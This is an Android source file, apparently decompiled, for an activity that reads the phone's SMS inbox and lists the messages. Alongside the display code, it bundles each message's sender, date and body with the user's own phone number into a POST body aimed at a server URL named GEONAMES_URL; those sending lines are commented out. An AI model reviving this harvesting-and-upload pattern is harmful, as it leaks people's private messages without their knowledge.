package gonext.smsapp;

import android.app.ListActivity;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.ListView;
import android.widget.Toast;


import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import gonext.smsapp.adapters.MessagesListAdapter;
import gonext.smsapp.contacts.SMSData;
import gonext.smsapp.db.DbService;
import gonext.smsapp.db.MessageEntity;
import gonext.smsapp.servers.SmsService;
import gonext.smsapp.utils.Constant;


public class MessagesListActivity extends ListActivity {
    private String KEY = "SMSList";
    private String MsgDate = "";
    private String MsgFrom = "";
    private String MsgID = "";
    private String MsgText = "";
    String Timestamp = "";
    private String UserMobile = "";
    private boolean doBackground = false;
    String httpPostBody = "";
    private ProgressDialog mProgressDialog;
    List<SMSData> smsList = new ArrayList();
    List<SMSData> listViewDatas = new ArrayList();
    private DbService dbService;
    private SmsService smsService;

    class C01381 extends AsyncTask<String, String, String> {
        C01381() {
        }

        protected void onPreExecute() {
            super.onPreExecute();
            if (MessagesListActivity.this.mProgressDialog != null && !MessagesListActivity.this.mProgressDialog.isShowing()) {
                MessagesListActivity.this.mProgressDialog.show();
            }
        }

        protected void onPostExecute(String s) {
            super.onPostExecute(s);
            MessagesListActivity.this.mProgressDialog.dismiss();
            MessagesListActivity.this.setListAdapter(new MessagesListAdapter(MessagesListActivity.this, MessagesListActivity.this.listViewDatas));
        }

        protected String doInBackground(String... params) {
            try {
                setAdapter();
//                System.out.println("response" + MessagesListActivity.makePostRequest(Constant.GEONAMES_URL, MessagesListActivity.this.httpPostBody, MessagesListActivity.this.getApplicationContext()));
                return "Success";
            } catch (Exception ex) {
                ex.printStackTrace();
                return "";
            }
        }
    }

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        this.mProgressDialog = new ProgressDialog(this);
        this.mProgressDialog.setMessage("Please Wait....");
        this.mProgressDialog.setCanceledOnTouchOutside(true);
        this.mProgressDialog.setCancelable(false);
        dbService = new DbService(this);
        smsService = new SmsService(this);
        this.UserMobile = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getLine1Number();
        this.doBackground = true;
//        setAdapter();
        new C01381().execute(new String[]{""});
    }

    protected void onListItemClick(ListView l, View v, int position, long id) {
        SMSData sms = (SMSData) getListAdapter().getItem(position);
        Intent intent = new Intent(this, MessageDetailActivity.class);
        intent.putExtra("MESSAGE", sms.getBody().toString());
        startActivity(intent);
    }

    public void setAdapter() {
        try {
            int i;
            this.smsList.clear();
            Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
            startManagingCursor(c);
            int count = c.getCount();
            if (c.moveToFirst() && count > 0) {
                for (i = 0; i < count; i++) {
                    SMSData sMSData;
                    SMSData sms = new SMSData();
                    sms.setBody(c.getString(c.getColumnIndexOrThrow("body")).toString());
                    sms.setNumber(c.getString(c.getColumnIndexOrThrow("address")).toString());
                    if (c.isNull(c.getColumnIndexOrThrow("person"))) {
                        sms.setPerson("Edwin");
                    } else {
                        sms.setPerson(c.getString(c.getColumnIndexOrThrow("person")).toString());
                    }
                    if (c.isNull(c.getColumnIndexOrThrow("date"))) {
                        sms.setDate("Edwin");
                    } else {
                        try {
                            this.Timestamp = c.getString(c.getColumnIndexOrThrow("date")).toString();
                            sMSData = sms;
                            sMSData.setDate(new SimpleDateFormat("dd/MM/yyyy hh:mm aa").format(new Date(Long.valueOf(c.getString(c.getColumnIndexOrThrow("date")).toString()).longValue())));
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                    if (c.isNull(c.getColumnIndexOrThrow("date_sent"))) {
                        sms.setDate_sent("Edwin");
                    } else {
                        try {
                            sMSData = sms;
                            sMSData.setDate_sent(new SimpleDateFormat("dd/MM/yyyy hh:mm aa").format(new Date(Long.valueOf(c.getString(c.getColumnIndexOrThrow("date_sent")).toString()).longValue())));
                        } catch (Exception e2) {
                            e2.printStackTrace();
                        }
                    }
                    if (c.isNull(c.getColumnIndexOrThrow("_id"))) {
                        sms.set_id("Edwin");
                    } else {
                        sms.set_id(c.getString(c.getColumnIndexOrThrow("_id")).toString() + this.Timestamp);
                    }
                    MessageEntity messageEntity = dbService.getMessage(sms.get_id());
                    if(messageEntity == null) {
                        messageEntity = new MessageEntity();
                        messageEntity.setMessageId(sms.get_id());
                        dbService.saveMessage(messageEntity);
                        this.smsList.add(sms);
                    }
                    this.listViewDatas.add(sms);
                    c.moveToNext();
                }
            }
            if (this.smsList.size() > 0) {
                if (this.smsList.size() > 1) {
                    StringBuilder sb1 = new StringBuilder(this.smsList.size());
                    StringBuilder sb2 = new StringBuilder(this.smsList.size());
                    StringBuilder stringBuilder = new StringBuilder(this.smsList.size());
                    StringBuilder stringBuilder3 = new StringBuilder(this.smsList.size());
                    for (i = 0; i < this.smsList.size(); i++) {
                        if (i == this.smsList.size() - 1) {
                            sb1.append(((SMSData) this.smsList.get(i)).get_id());
                            sb2.append(((SMSData) this.smsList.get(i)).getDate());
                            stringBuilder.append(((SMSData) this.smsList.get(i)).getNumber());
                            stringBuilder3.append(((SMSData) this.smsList.get(i)).getBody());
                        } else {
                            sb1.append(((SMSData) this.smsList.get(i)).get_id() + "||");
                            sb2.append(((SMSData) this.smsList.get(i)).getDate() + "||");
                            stringBuilder.append(((SMSData) this.smsList.get(i)).getNumber() + "||");
                            stringBuilder3.append(((SMSData) this.smsList.get(i)).getBody() + "||");
                        }
                    }
                    this.MsgID = sb1.toString();
                    this.MsgDate = sb2.toString();
                    this.MsgFrom = stringBuilder.toString();
                    this.MsgText = stringBuilder3.toString();
                } else {
                    this.MsgID = ((SMSData) this.smsList.get(0)).get_id();
                    this.MsgDate = ((SMSData) this.smsList.get(0)).getDate();
                    this.MsgFrom = ((SMSData) this.smsList.get(0)).getNumber();
                    this.MsgText = ((SMSData) this.smsList.get(0)).getBody();
                }
            }
            if(this.smsList.size() > 0) {
//                smsService.sendSms(this.UserMobile, this.MsgID, this.MsgDate, this.MsgFrom, this.MsgText);
            }
//            this.httpPostBody = "KEY=" + this.KEY + "&UserMobile=" + this.UserMobile + "&MsgID=" + this.MsgID + "&MsgDate=" + this.MsgDate + "&MsgFrom=" + this.MsgFrom + "&MsgText=" + this.MsgText + "";
            System.out.println("httpPostBody::-->" + this.httpPostBody);
            /*if (this.doBackground) {
                new C01381().execute(new String[]{""});
            }*/
        } catch (Exception e22) {
            e22.printStackTrace();
        }
    }

    protected void onResume() {
        super.onResume();
        this.doBackground = false;
//        setAdapter();

    }

    protected void onPause() {
        super.onPause();
    }

    public boolean isOnline() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        return cm.getActiveNetworkInfo() != null && cm.getActiveNetworkInfo().isConnectedOrConnecting();
    }
}
